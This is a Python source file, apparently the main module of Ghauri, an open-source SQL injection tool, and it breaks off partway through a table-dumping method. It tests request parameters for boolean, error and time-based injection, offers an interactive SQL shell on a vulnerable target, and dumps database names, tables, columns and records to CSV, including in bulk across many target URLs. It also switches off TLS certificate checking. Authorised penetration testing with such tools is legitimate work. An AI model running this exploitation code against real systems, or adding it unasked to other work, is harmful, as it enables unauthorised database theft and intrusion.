#!/usr/bin/python3
# -*- coding: utf-8 -*-
# pylint: disable=R,W,E,C

"""

Author  : Nasir Khan (r0ot h3x49)
Github  : https://github.com/r0oth3x49
License : MIT


Copyright (c) 2016-2025 Nasir Khan (r0ot h3x49)

Permission is hereby granted, free of charge, to any person obtaining a copy of this software and associated documentation files (the "Software"), to deal in the
Software without restriction, including without limitation the rights to use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of the Software,
and to permit persons to whom the Software is furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF
MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR
ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH 
THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.

"""
from ghauri.common.config import conf
from ghauri.common.session import session
from ghauri.extractor.common import target
from ghauri.extractor.advance import target_adv
from ghauri.core.extract import ghauri_extractor
from ghauri.logger.colored_logger import logger, set_level
from ghauri.core.tests import basic_check, check_injections
from ghauri.core.extract import ghauri_extractor as ge
from ghauri.core.update import update_ghauri
from ghauri.common.lib import (
    os,
    re,
    ssl,
    json,
    quote,
    urllib3,
    logging,
    base64,
    collections,
    PAYLOAD_STATEMENT,
)
from ghauri.common.utils import (
    to_list,
    HTTPRequest,
    prepare_proxy,
    prepare_custom_headers,
    prepare_attack_request,
    check_boolean_responses,
    extract_uri_params,
    extract_injection_points,
    fetch_db_specific_payload,
    check_injection_points_for_level,
    dbms_full_name,
    is_deserializable,
    get_user_agent,
)

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


def perform_multitarget_injection(args):
    logger.start("starting")
    verbose_levels = {
        1: logging.INFO,
        2: logging.DEBUG,
        3: logging.PAYLOAD,
        4: logging.TRAFFIC_OUT,
        5: logging.TRAFFIC_IN,
    }
    verbose_level = verbose_levels.get(args.verbose, logging.INFO)
    set_level(verbose_level, "")
    logger.info(f"parsing multiple targets list from '{args.bulkfile}'")
    urls = [i.strip() for i in open(args.bulkfile) if i]
    logger.info(f"found a total of {len(urls)} targets")
    for index, url in enumerate(urls):
        message = f"[{index+1}/{len(urls)}] URL:\nGET {url}\ndo you want to test this URL? [Y/n/q]\n> "
        choice = logger.read_input(message, batch=args.batch, user_input="Y")
        if choice == "q":
            break
        if choice == "y":
            logger.info(f"testing URL '{url}'")
            # this csv message should appear only one time
            session.generate_filepath(
                url,
                multitarget_mode=True,
            )
            if not conf._mt_mode:
                logger.info(
                    f"using '{conf._multitarget_csv}' as the CSV results file in multiple targets mode"
                )
                conf._mt_mode = True
            resp = perform_injection(
                url=url,
                data=args.data,
                host=args.host,
                header=args.header,
                cookies=args.cookie,
                headers=args.headers,
                referer=args.referer,
                user_agent=args.user_agent,
                level=args.level,
                verbosity=args.verbose,
                techniques=args.tech,
                batch=args.batch,
                requestfile=args.requestfile,
                flush_session=args.flush_session,
                proxy=args.proxy,
                force_ssl=args.force_ssl,
                timeout=args.timeout,
                delay=args.delay,
                timesec=args.timesec,
                dbms=dbms_full_name(args.dbms),
                testparameter=args.testparameter,
                retries=args.retries,
                prefix=args.prefix,
                suffix=args.suffix,
                code=args.code,
                string=args.string,
                not_string=args.not_string,
                text_only=args.text_only,
                skip_urlencoding=args.skip_urlencoding,
                threads=args.threads,
                confirm_payloads=args.confirm_payloads,
                safe_chars=args.safe_chars,
                fetch_using=args.fetch_using,
                test_filter=args.test_filter,
                sql_shell=args.sql_shell,
                fresh_queries=args.fresh_queries,
                update=args.update,
                ignore_code=args.ignore_code,
                bulkfile=True,
                random_agent=args.random_agent,
                mobile=args.mobile,
            )
            if resp.is_injected:
                exp_choice = logger.read_input(
                    "do you want to exploit this SQL injection? [Y/n] ",
                    batch=args.batch,
                    user_input="Y",
                )
                try:
                    techniques = {
                        "error_vector": "E",
                        "boolean_vector": "B",
                        "time_vector": "T",
                    }
                    keys = resp.vectors.keys()
                    tech = []
                    for vect in keys:
                        tech.append(techniques[vect])
                    session.dump_to_csv(
                        [
                            [
                                resp.url,
                                resp.injection_type,
                                resp.parameter.key,
                                ",".join(tech),
                            ]
                        ],
                        field_names=[
                            "Target URL",
                            "Place",
                            "Parameter",
                            "Technique(s)",
                        ],
                        filepath=conf._multitarget_csv,
                        is_multitarget=True,
                    )
                except Exception as error:
                    logger.debug(error)
                if exp_choice == "y":
                    target = Ghauri(
                        url=resp.url,
                        data=resp.data,
                        vector=resp.vector,
                        backend=resp.backend,
                        parameter=resp.parameter,
                        headers=resp.headers,
                        base=resp.base,
                        injection_type=resp.injection_type,
                        proxy=resp.proxy,
                        filepaths=resp.filepaths,
                        is_multipart=resp.is_multipart,
                        timeout=args.timeout,
                        delay=args.delay,
                        timesec=args.timesec,
                        attack=resp.attack,
                        match_string=resp.match_string,
                        vectors=resp.vectors,
                    )
                    current_db = None
                    if args.banner:
                        target.extract_banner()
                    if args.current_user:
                        target.extract_current_user()
                    if args.current_db:
                        response = target.extract_current_db()
                        current_db = response.result.strip() if response.ok else None
                    if args.hostname:
                        target.extract_hostname()
                    if args.dbs:
                        target.extract_dbs(start=args.limitstart, stop=args.limitstop)
                    if args.db and args.tables:
                        target.extract_tables(
                            database=args.db, start=args.limitstart, stop=args.limitstop
                        )
                    if args.db and args.tbl and args.columns:
                        target.extract_columns(
                            database=args.db,
                            table=args.tbl,
                            start=args.limitstart,
                            stop=args.limitstop,
                        )
                    if args.db and args.tbl and args.count_only:
                        target.extract_records(
                            database=args.db,
                            table=args.tbl,
                            columns="",
                            start=args.limitstart,
                            stop=args.limitstop,
                            count_only=args.count_only,
                        )
                    if args.db and args.tbl and args.cols and args.dump:
                        target.extract_records(
                            database=args.db,
                            table=args.tbl,
                            columns=args.cols,
                            start=args.limitstart,
                            stop=args.limitstop,
                        )
                    if args.db and args.dump and not args.tbl and not args.cols:
                        target.dump_database(
                            database=args.db,
                            start=args.limitstart,
                            stop=args.limitstop,
                            dump_requested=True,
                        )
                    if args.db and args.tbl and args.dump and not args.cols:
                        target.dump_table(
                            database=args.db,
                            table=args.tbl,
                            start=args.limitstart,
                            stop=args.limitstop,
                            dump_requested=True,
                        )
                    if args.dump and not args.db and not args.tbl and not args.cols:
                        target.dump_current_db(
                            current_db=current_db, dump_requested=True
                        )
                    logger.success("")
    logger.end("ending")


def perform_injection(
    url="",
    data="",
    host="",
    header="",
    cookies="",
    headers="",
    referer="",
    user_agent="",
    level=1,
    verbosity=1,
    techniques="BT",
    requestfile="",
    flush_session=False,
    proxy=None,
    batch=False,
    force_ssl=False,
    timeout=30,
    delay=0,
    timesec=5,
    dbms=None,
    testparameter=None,
    retries=3,
    prefix=None,
    suffix=None,
    code=200,
    string=None,
    not_string=None,
    text_only=False,
    skip_urlencoding=False,
    threads=None,
    confirm_payloads=False,
    safe_chars=None,
    fetch_using=None,
    test_filter=None,
    sql_shell=False,
    fresh_queries=False,
    update=False,
    ignore_code="",
    bulkfile=False,
    random_agent=False,
    mobile=False,
):
    verbose_levels = {
        1: logging.INFO,
        2: logging.DEBUG,
        3: logging.PAYLOAD,
        4: logging.TRAFFIC_OUT,
        5: logging.TRAFFIC_IN,
    }
    is_custom_point = False
    conf.skip_urlencoding = skip_urlencoding
    conf.confirm_payloads = confirm_payloads
    conf.safe_chars = safe_chars
    conf.timesec = timesec
    conf.fetch_using = fetch_using
    conf.test_filter = test_filter
    conf.fresh_queries = fresh_queries
    conf._ignore_code = ignore_code
    conf.batch = batch
    conf._random_ua = random_agent
    conf._is_mobile_ua = mobile
    if not bulkfile:
        logger.start("starting")
    if not force_ssl:
        ssl._create_default_https_context = ssl._create_unverified_context
    if proxy:
        conf.proxy = proxy = prepare_proxy(proxy)
    verbose_level = verbose_levels.get(verbosity, logging.INFO)
    set_level(verbose_level, "")
    if threads and threads > 1:
        conf.threads = threads
    if update:
        try:
            update_ghauri()
            logger.end("ending")
            exit(0)
        except Exception as error:
            logger.error("could not update ghauri, do it manually...")
            logger.end("ending")
            exit(0)
    GhauriResponse = collections.namedtuple(
        "GhauriResponse",
        [
            "url",
            "data",
            "vector",
            "backend",
            "parameter",
            "headers",
            "base",
            "injection_type",
            "proxy",
            "filepaths",
            "is_injected",
            "is_multipart",
            "attack",
            "match_string",
            "vectors",
            "not_match_string",
            "code",
            "text_only",
        ],
    )
    levels = {2: "COOKIE", 3: "HEADER"}
    raw = ""
    if requestfile:
        if not os.path.isfile(requestfile):
            logger.error(
                "invalid filename of file location, please provide correct filepath e.g:- '-r /path/to/requestfile.txt'"
            )
            logger.end("ending")
            exit(0)
        logger.info(f"parsing HTTP request from '{requestfile}'")
        # raw = "\n".join([i.strip() for i in open(requestfile) if i])
        raw = "\n".join(
            [re.sub(r"[^\x00-\x7F]+", " ", i.strip()) for i in open(requestfile) if i]
        )
    get_user_agent(random=conf._random_ua)
    if raw:
        req = HTTPRequest(raw)
        url = req.url
        headers = req.headers
        header_keys = headers.keys()
        if not req.host and not header_keys:
            logger.debug("invalid format of a request file")
            logger.critical(
                f"specified file '{requestfile}' does not contain a usable HTTP request (with parameters)"
            )
            logger.end("ending")
            exit(0)
        full_headers = req.raw_full_headers
        raw_cookies = req.raw_cookies
        data = req.body
        method = req.method
    else:
        if not url.startswith("http"):
            url = f"http://{url}" if not url.startswith("//") else f"http:{url}"
        req = prepare_custom_headers(
            host=host,
            header=header,
            cookies=cookies,
            headers=headers,
            referer=referer,
            user_agent=user_agent,
        )
        headers = req.headers
        full_headers = req.raw_full_headers
        raw_cookies = req.raw_cookies
        data = data
        if url and data:
            method = "POST"
        elif url and not data:
            method = "GET"
    obj = extract_injection_points(
        url=url, data=data, headers=full_headers, cookies=raw_cookies
    )
    custom_injection_in = obj.custom_injection_in
    injection_points = obj.injection_point
    conf.is_multipart = is_multipart = obj.is_multipart
    conf.is_json = is_json = obj.is_json
    conf.is_xml = is_xml = obj.is_xml
    conf.text_only = text_only
    base = None
    is_asked = False
    is_mp_asked = False
    is_json_asked = False
    is_xml_asked = False
    is_resumed = False
    is_dynamic = False
    possible_dbms = None
    is_error_based_injected = False
    is_connection_tested = False
    injection_types = []
    is_remaining_tests_asked = False
    sd = data
    if is_multipart:
        sd = data.encode("unicode_escape").decode("utf-8")
    filepaths = session.generate_filepath(
        url, flush_session=flush_session, method=method, data=sd
    )
    conf.filepaths = filepaths
    filepath = os.path.dirname(filepaths.logs)
    set_level(verbose_level, filepaths.logs)
    is_params_found = check_injection_points_for_level(level, obj)
    if not is_params_found:
        obj = extract_uri_params(url, batch=batch)
        custom_injection_in = obj.custom_injection_in
        injection_points = obj.injection_point
        conf.is_multipart = is_multipart = obj.is_multipart
        conf.is_json = is_json = obj.is_json
        conf.is_xml = is_xml = obj.is_xml
        is_params_found = check_injection_points_for_level(level, obj)
        if not is_params_found:
            logger.critical(
                "no parameter(s) found for testing in the provided data (e.g. GET parameter 'id' in 'www.site.com/index.php?id=1')"
            )
            logger.end("ending")
            exit(0)
    if conf.safe_chars:
        logger.debug(
            f'Ghauri is going to skip urlencoding for provided safe character(s): "{safe_chars}"'
        )
    for injection_type in list(injection_points.keys()):
        if custom_injection_in:
            if "COOKIE" in custom_injection_in:
                level = 2
            if "HEADER" in custom_injection_in:
                level = 3
            question = None
            if "POST" in custom_injection_in:
                if not is_asked:
                    question = logger.read_input(
                        "custom injection marker ('*') found in POST body. Do you want to process it? [Y/n/q]",
                        batch=batch,
                        user_input="Y",
                    )
                    is_asked = True
            if "GET" in custom_injection_in:
                if not is_asked:
                    question = logger.read_input(
                        "custom injection marker ('*') found in option '-u'. Do you want to process it? [Y/n/q]",
                        batch=batch,
                        user_input="Y",
                    )
                    is_asked = True
            if "HEADER" in custom_injection_in or "COOKIE" in custom_injection_in:
                if not is_asked:
                    question = logger.read_input(
                        "custom injection marker ('*') found in option '--headers/--user-agent/--referer/--cookie'. Do you want to process it? [Y/n/q]",
                        batch=batch,
                        user_input="Y",
                    )
                    is_asked = True
            if question and question == "y":
                injection_types = custom_injection_in
            if question and question == "n":
                # when custom injection marker '*' is found but user don't want to scan those we will go with default level 1
                level = 1
                custom_injection_in = []
        if level == 1 and not injection_types:
            injection_types = ["GET", "POST"]
        if level == 2 and not injection_types:
            injection_types = ["GET", "POST", "COOKIE"]
        if level == 3 and not injection_types:
            injection_types = ["GET", "POST", "COOKIE", "HEADER"]
        if injection_type in injection_types:
            if is_multipart and not is_mp_asked and injection_type == "POST":
                question_mp = logger.read_input(
                    "Multipart-like data found in POST body. Do you want to process it? [Y/n/q] ",
                    batch=batch,
                    user_input="Y",
                )
                is_mp_asked = True
                if question_mp and question_mp == "q":
                    logger.end("ending")
                    exit(0)
            if is_json and not is_json_asked and injection_type == "POST":
                choice = logger.read_input(
                    "JSON data found in POST body. Do you want to process it? [Y/n/q] ",
                    batch=batch,
                    user_input="Y",
                )
                is_json_asked = True
                if choice and choice == "q":
                    logger.end("ending")
                    exit(0)
            if is_xml and not is_xml_asked and injection_type == "POST":
                choice = logger.read_input(
                    "SOAP/XML data found in POST body. Do you want to process it? [Y/n/q] ",
                    batch=batch,
                    user_input="Y",
                )
                is_json_asked = True
                if choice and choice == "q":
                    logger.end("ending")
                    exit(0)
            parameters = injection_points.get(injection_type)
            if testparameter:
                parameters = [i for i in parameters if i.key in testparameter]
            conf.params_count = len(parameters)
            for parameter in parameters:
                param_name = parameter.key
                param_value = parameter.value
                is_parameter_tested = False
                is_custom_injection_marker_found = bool(
                    "*" in param_name or "*" in param_value
                )
                if custom_injection_in and not is_custom_injection_marker_found:
                    logger.debug(
                        f"skipping '{injection_type}' parameter '{param_name}'..."
                    )
                    continue
                # if param_name.startswith("_"):
                #     if is_multipart:
                #         msg = f"ignoring (custom) {injection_type} parameter 'MULTIPART {param_name}'"
                #     else:
                #         msg = f"ignoring {injection_type} parameter '{param_name}'"
                #     logger.info(msg)
                #     continue
                is_serialized = is_deserializable(
                    parameter, injection_type=injection_type
                )
                if is_serialized:
                    for bkey, bvalue in conf._deserialized_data.items():
                        conf.params_count -= 1
                        conf._deserialized_data_param = bkey
                        conf._deserialized_data_param_value = bvalue
                        if not is_connection_tested:
                            retval_check = basic_check(
                                url=url,
                                data=data,
                                headers=full_headers,
                                proxy=proxy,
                                timeout=timeout,
                                batch=batch,
                                parameter=parameter,
                                injection_type=injection_type,
                                is_multipart=is_multipart,
                                techniques=techniques.upper(),
                                is_json=is_json,
                            )
                            base = retval_check.base
                            conf.base = base
                            conf.text_only = is_dynamic = (
                                retval_check.is_dynamic if not text_only else text_only
                            )
                            possible_dbms = retval_check.possible_dbms
                            is_connection_tested = retval_check.is_connection_tested
                            is_parameter_tested = retval_check.is_parameter_tested
                            is_resumed = retval_check.is_resumed
                        if not is_resumed or not is_parameter_tested:
                            msg = f"testing for SQL injection on {injection_type} parameter '{param_name} ({conf._deserialized_data_param})'"
                            logger.info(msg)
                        if possible_dbms:
                            if not dbms:
                                choice = logger.read_input(
                                    f"it looks like the back-end DBMS is '{possible_dbms}'. Do you want to skip test payloads specific for other DBMSes? [Y/n] ",
                                    batch=batch,
                                    user_input="Y",
                                )
                                if choice == "y":
                                    dbms = possible_dbms
                            if not conf.test_filter:
                                if conf.prioritize and not conf._is_asked_for_priority:
                                    conf._is_asked_for_priority = True
                                    choice_priority = logger.read_input(
                                        f"it is suggested to set '--technique=E{techniques.upper()}'. Do you want Ghauri set it for you ? [Y/n] ",
                                        batch=batch,
                                        user_input="Y",
                                    )
                                    if choice_priority == "y":
                                        techniques = f"E{techniques.upper()}"
                            if dbms and possible_dbms == dbms:
                                if not is_remaining_tests_asked:
                                    choice = logger.read_input(
                                        f"for the remaining tests, do you want to include all tests for '{possible_dbms}'? [Y/n] ",
                                        batch=batch,
                                        user_input="Y",
                                    )
                                    is_remaining_tests_asked = True
                                    if choice == "n":
                                        pass
                        retval = check_injections(
                            base,
                            parameter,
                            url=url,
                            data=data,
                            proxy=proxy,
                            headers=full_headers,
                            injection_type=injection_type,
                            batch=batch,
                            is_multipart=is_multipart,
                            timeout=timeout,
                            delay=delay,
                            timesec=timesec,
                            dbms=dbms,
                            techniques=techniques.upper(),
                            possible_dbms=possible_dbms,
                            session_filepath=filepaths.session,
                            is_json=is_json,
                            retries=retries,
                            prefix=prefix,
                            suffix=suffix,
                            code=code if code != 200 else None,
                            string=string,
                            not_string=not_string,
                            text_only=conf.text_only,
                        )
                        # will handle this part later on if any issue found...
                        if retval and retval.vulnerable:
                            break
                else:
                    conf.params_count -= 1
                    if not is_connection_tested:
                        retval_check = basic_check(
                            url=url,
                            data=data,
                            headers=full_headers,
                            proxy=proxy,
                            timeout=timeout,
                            batch=batch,
                            parameter=parameter,
                            injection_type=injection_type,
                            is_multipart=is_multipart,
                            techniques=techniques.upper(),
                            is_json=is_json,
                        )
                        base = retval_check.base
                        conf.base = base
                        conf.text_only = is_dynamic = (
                            retval_check.is_dynamic if not text_only else text_only
                        )
                        possible_dbms = retval_check.possible_dbms
                        is_connection_tested = retval_check.is_connection_tested
                        is_parameter_tested = retval_check.is_parameter_tested
                        is_resumed = retval_check.is_resumed
                    if not is_resumed or not is_parameter_tested:
                        if custom_injection_in:
                            custom_point = custom_injection_in[-1]
                            if "HEADER" in custom_point:
                                msg = f"testing for SQL injection on (custom) {injection_type} parameter '{param_name} #1*'"
                            elif "COOKIE" in custom_point:
                                msg = f"testing for SQL injection on (custom) {injection_type} parameter '{param_name} #1*'"
                            elif param_name == "#1*" and "GET" in custom_point:
                                msg = f"testing for SQL injection on (custom) URI parameter '#1*'"
                            elif "GET" in custom_point and param_name != "#1*":
                                msg = f"testing for SQL injection on (custom) {injection_type} parameter '{param_name}'"
                            elif "POST" in custom_point:
                                if is_multipart:
                                    msg = f"testing for SQL injection on (custom) {injection_type} parameter '{parameter.type}{param_name}'"
                                elif is_json:
                                    msg = f"testing for SQL injection on (custom) {injection_type} parameter '{parameter.type}{param_name}'"
                                elif is_xml:
                                    msg = f"testing for SQL injection on (custom) {injection_type} parameter '{parameter.type}{param_name}'"
                                else:
                                    msg = f"testing for SQL injection on (custom) {injection_type} parameter '{param_name}'"
                        else:
                            if is_multipart:
                                msg = f"testing for SQL injection on (custom) {injection_type} parameter '{parameter.type}{param_name}'"
                            elif is_json:
                                msg = f"testing for SQL injection on (custom) {injection_type} parameter '{parameter.type}{param_name}'"
                            elif is_xml:
                                msg = f"testing for SQL injection on (custom) {injection_type} parameter '{parameter.type}{param_name}'"
                            else:
                                msg = f"testing for SQL injection on {injection_type} parameter '{param_name}'"
                        logger.info(msg)
                    if possible_dbms:
                        if not dbms:
                            choice = logger.read_input(
                                f"it looks like the back-end DBMS is '{possible_dbms}'. Do you want to skip test payloads specific for other DBMSes? [Y/n] ",
                                batch=batch,
                                user_input="Y",
                            )
                            if choice == "y":
                                dbms = possible_dbms
                        if not conf.test_filter:
                            if conf.prioritize and not conf._is_asked_for_priority:
                                conf._is_asked_for_priority = True
                                choice_priority = logger.read_input(
                                    f"it is suggested to set '--technique=E{techniques.upper()}'. Do you want Ghauri set it for you ? [Y/n] ",
                                    batch=batch,
                                    user_input="Y",
                                )
                                if choice_priority == "y":
                                    techniques = f"E{techniques.upper()}"
                        if dbms and possible_dbms == dbms:
                            if not is_remaining_tests_asked:
                                choice = logger.read_input(
                                    f"for the remaining tests, do you want to include all tests for '{possible_dbms}'? [Y/n] ",
                                    batch=batch,
                                    user_input="Y",
                                )
                                is_remaining_tests_asked = True
                                if choice == "n":
                                    pass
                    retval = check_injections(
                        base,
                        parameter,
                        url=url,
                        data=data,
                        proxy=proxy,
                        headers=full_headers,
                        injection_type=injection_type,
                        batch=batch,
                        is_multipart=is_multipart,
                        timeout=timeout,
                        delay=delay,
                        timesec=timesec,
                        dbms=dbms,
                        techniques=techniques.upper(),
                        possible_dbms=possible_dbms,
                        session_filepath=filepaths.session,
                        is_json=is_json,
                        retries=retries,
                        prefix=prefix,
                        suffix=suffix,
                        code=code if code != 200 else None,
                        string=string,
                        not_string=not_string,
                        text_only=conf.text_only,
                    )
                if retval and retval.vulnerable:
                    backend = retval.backend
                    parameter = retval.parameter
                    match_string = retval.match_string
                    attack = retval.boolean_false_attack
                    injection_type = retval.injection_type
                    vectors = retval.vectors
                    conf.vectors = vectors
                    conf.is_string = retval.is_string
                    vector = vectors.get("error_vector")
                    if not vector:
                        vector = vectors.get("boolean_vector")
                    if not vector:
                        vector = vectors.get("time_vector")
                    if backend == "Microsoft Access":
                        logger.warning(
                            "ghauri currently only supports DBMS fingerprint payloads for Microsoft Access, exfiltration will be added soon"
                        )
                        logger.info(
                            f"fetched data logged to text files under '{filepaths.filepath}'"
                        )
                        logger.end("ending")
                        exit(1)
                    if sql_shell:
                        logger.info(
                            "calling MySQL shell. To quit type 'x' or 'q' and press ENTER"
                        )
                        while True:
                            choice = logger.read_input("sql-shell> ")
                            if choice:
                                if choice.lower() in ["x", "q"]:
                                    break
                                logger.info(f"fetching SQL query output: '{choice}'")
                                retval = ghauri_extractor.fetch_characters(
                                    url=url,
                                    data=data,
                                    vector=vector,
                                    parameter=parameter,
                                    headers=full_headers,
                                    base=base,
                                    injection_type=injection_type,
                                    payloads=[choice],
                                    backend=backend,
                                    proxy=proxy,
                                    is_multipart=is_multipart,
                                    timeout=timeout,
                                    delay=delay,
                                    timesec=timesec,
                                    attack01=attack,
                                    match_string=match_string,
                                    not_match_string=None,
                                    code=code if code != 200 else None,
                                    text_only=conf.text_only,
                                    dump_type=choice,
                                )
                                if retval.ok:
                                    if retval.resumed:
                                        logger.info("resumed: '%s'" % (retval.result))
                                    else:
                                        logger.info("retrieved: '%s'" % (retval.result))
                                    logger.success(f"{choice}: '{retval.result}'")
                        logger.info(
                            f"fetched data logged to text files under: '{filepaths.filepath}'"
                        )
                        logger.end("ending")
                        exit(0)
                    else:
                        return GhauriResponse(
                            url=url,
                            data=data,
                            vector=vector,
                            backend=backend,
                            parameter=parameter,
                            headers=full_headers,
                            base=base,
                            injection_type=injection_type,
                            proxy=proxy,
                            filepaths=filepaths,
                            is_injected=True,
                            is_multipart=is_multipart,
                            attack=attack,
                            match_string=match_string,
                            vectors=vectors,
                            code=code if code != 200 else None,
                            not_match_string=None,
                            text_only=conf.text_only,
                        )
    # end of injection
    logger.critical("all tested parameters do not appear to be injectable.")
    logger.end("ending")

    return GhauriResponse(
        url="",
        data="",
        vector="",
        backend="",
        parameter="",
        headers="",
        base="",
        injection_type="",
        proxy="",
        filepaths="",
        is_injected=False,
        is_multipart=False,
        attack=None,
        match_string=None,
        vectors={},
        code=None,
        not_match_string=None,
        text_only=None,
    )


class Ghauri:
    """This class will perform rest of data extraction process"""

    def __init__(
        self,
        url,
        data="",
        vector="",
        backend="",
        parameter="",
        headers="",
        base="",
        injection_type="",
        proxy="",
        filepaths=None,
        is_multipart=False,
        timeout=30,
        delay=0,
        timesec=5,
        attack=None,
        match_string=None,
        vectors=None,
        not_match_string=None,
        code=None,
        text_only=False,
    ):
        self.url = url
        self.data = data
        self.vector = vector
        self.backend = backend
        self.parameter = parameter
        self.headers = headers
        self.base = base
        self.injection_type = injection_type
        self.proxy = proxy
        self.is_multipart = is_multipart
        self.filepaths = filepaths
        self._filepath = filepaths.filepath
        self.timeout = timeout
        self.delay = delay
        self.timesec = timesec
        self._attack = attack
        self._match_string = match_string
        self._vectors = vectors
        self._not_match_string = not_match_string
        self._code = code
        self._text_only = text_only

    def _end(self, database="", table="", fetched=True):
        new_line = ""
        if database and table:
            filepath = os.path.join(conf.filepaths.filepath, "dump")
            filepath = os.path.join(filepath, database)
            filepath = os.path.join(filepath, f"{table}.csv")
            message = f"\ntable '{database}.{table}' dumped to CSV file '{filepath}'"
            logger.info(message)
            new_line = ""
        if fetched:
            logger.info(
                f"{new_line}fetched data logged to text files under '{self._filepath}'"
            )
            logger.end("ending")

    def extract_banner(self):
        response = target.fetch_banner(
            self.url,
            data=self.data,
            vector=self.vector,
            parameter=self.parameter,
            headers=self.headers,
            base=self.base,
            injection_type=self.injection_type,
            backend=self.backend,
            proxy=self.proxy,
            is_multipart=self.is_multipart,
            timeout=self.timeout,
            delay=self.delay,
            timesec=self.timesec,
            attack=self._attack,
            match_string=self._match_string,
            not_match_string=self._not_match_string,
            code=self._code,
            text_only=self._text_only,
        )
        fetched = response.ok
        # if fetched:
        #     logger.success("")
        return response

    def extract_hostname(self):
        response = target.fetch_hostname(
            self.url,
            data=self.data,
            vector=self.vector,
            parameter=self.parameter,
            headers=self.headers,
            base=self.base,
            injection_type=self.injection_type,
            backend=self.backend,
            proxy=self.proxy,
            is_multipart=self.is_multipart,
            timeout=self.timeout,
            delay=self.delay,
            timesec=self.timesec,
            attack=self._attack,
            match_string=self._match_string,
            not_match_string=self._not_match_string,
            code=self._code,
            text_only=self._text_only,
        )
        fetched = response.ok
        # if fetched:
        #     logger.success("")
        return response

    def extract_current_db(self):
        response = target.fetch_current_database(
            self.url,
            data=self.data,
            vector=self.vector,
            parameter=self.parameter,
            headers=self.headers,
            base=self.base,
            injection_type=self.injection_type,
            backend=self.backend,
            proxy=self.proxy,
            is_multipart=self.is_multipart,
            timeout=self.timeout,
            delay=self.delay,
            timesec=self.timesec,
            attack=self._attack,
            match_string=self._match_string,
            not_match_string=self._not_match_string,
            code=self._code,
            text_only=self._text_only,
        )
        fetched = response.ok
        # if fetched:
        #     logger.success("")
        return response

    def extract_current_user(self):
        response = target.fetch_current_user(
            self.url,
            data=self.data,
            vector=self.vector,
            parameter=self.parameter,
            headers=self.headers,
            base=self.base,
            injection_type=self.injection_type,
            backend=self.backend,
            proxy=self.proxy,
            is_multipart=self.is_multipart,
            timeout=self.timeout,
            delay=self.delay,
            timesec=self.timesec,
            attack=self._attack,
            match_string=self._match_string,
            not_match_string=self._not_match_string,
            code=self._code,
            text_only=self._text_only,
        )
        fetched = response.ok
        # if fetched:
        #     logger.success("")
        return response

    def extract_dbs(self, start=0, stop=None):
        response = target_adv.fetch_dbs(
            self.url,
            data=self.data,
            vector=self.vector,
            parameter=self.parameter,
            headers=self.headers,
            base=self.base,
            injection_type=self.injection_type,
            backend=self.backend,
            proxy=self.proxy,
            is_multipart=self.is_multipart,
            timeout=self.timeout,
            delay=self.delay,
            timesec=self.timesec,
            attack=self._attack,
            match_string=self._match_string,
            not_match_string=self._not_match_string,
            code=self._code,
            text_only=self._text_only,
            start=start,
            stop=stop,
        )
        fetched = response.ok
        if not fetched:
            response = self.extract_current_db()
        # if fetched:
        #     logger.success("")
        return response

    def extract_tables(self, database="", start=0, stop=None, dump_requested=False):
        response = target_adv.fetch_tables(
            self.url,
            data=self.data,
            vector=self.vector,
            parameter=self.parameter,
            headers=self.headers,
            base=self.base,
            injection_type=self.injection_type,
            backend=self.backend,
            proxy=self.proxy,
            is_multipart=self.is_multipart,
            timeout=self.timeout,
            delay=self.delay,
            timesec=self.timesec,
            attack=self._attack,
            match_string=self._match_string,
            not_match_string=self._not_match_string,
            code=self._code,
            text_only=self._text_only,
            start=start,
            stop=stop,
            database=database,
        )
        fetched = response.ok
        # if not fetched:
        # logger.success("")
        # else:
        # logger.error("unable to retrieve the table names for any database")
        # print("\n")
        return response

    def extract_columns(
        self, database="", table="", start=0, stop=None, dump_requested=False
    ):
        response = target_adv.fetch_columns(
            self.url,
            data=self.data,
            vector=self.vector,
            parameter=self.parameter,
            headers=self.headers,
            base=self.base,
            injection_type=self.injection_type,
            backend=self.backend,
            proxy=self.proxy,
            is_multipart=self.is_multipart,
            timeout=self.timeout,
            delay=self.delay,
            timesec=self.timesec,
            attack=self._attack,
            match_string=self._match_string,
            not_match_string=self._not_match_string,
            code=self._code,
            text_only=self._text_only,
            start=start,
            stop=stop,
            database=database,
            table=table,
        )
        fetched = response.ok
        # if fetched:
        #     logger.success("")
        return response

    def extract_records(
        self,
        database="",
        table="",
        columns="",
        start=0,
        stop=None,
        dump_requested=False,
        count_only=False,
    ):
        response = ""
        tables = to_list(table)
        for table in tables:
            response = target_adv.dump_table(
                self.url,
                data=self.data,
                vector=self.vector,
                parameter=self.parameter,
                headers=self.headers,
                base=self.base,
                injection_type=self.injection_type,
                backend=self.backend,
                proxy=self.proxy,
                is_multipart=self.is_multipart,
                timeout=self.timeout,
                delay=self.delay,
                timesec=self.timesec,
                attack=self._attack,
                match_string=self._match_string,
                not_match_string=self._not_match_string,
                code=self._code,
                text_only=self._text_only,
                start=start,
                stop=stop,
                database=database,
                table=table,
                columns=columns,
                count_only=count_only,
            )
            fetched = response.ok
            if fetched:
                if not dump_requested and not count_only:
                    # logger.success("")
                    self._end(database=database, table=table, fetched=False)
        return response

    def dump_database(self, database="", start=0, stop=None, dump_requested=False):
        retval_tables = self.extract_tables(
            database=database,
            start=start,
            stop=stop,
            dump_requested=dump_requested,
        )
        if retval_tables.ok:
            for table in retval_tables.result:
                retval_columns = self.extract_columns(
                    database=database,
                    table=table,
                    start=start,
                    stop=stop,
                    dump_requested=dump_requested,
                )
                if retval_columns.ok:
                    retval_dump = self.extract_records(
                        database=database,
                        table=table,
                        columns=",".join(list(retval_columns.result)),
                        start=start,
                        stop=stop,
                        dump_requested=dump_requested,
                    )
                    if retval_dump.ok:
                        self._end(database=database, table=table, fetched=False)

    def dump_table(
        self, database="", table="", start=0, stop=None, dump_requested=False
    ):
        retval_columns = self.extract_columns(
            database=database,
            table=table,
            start=start,
            stop=stop,
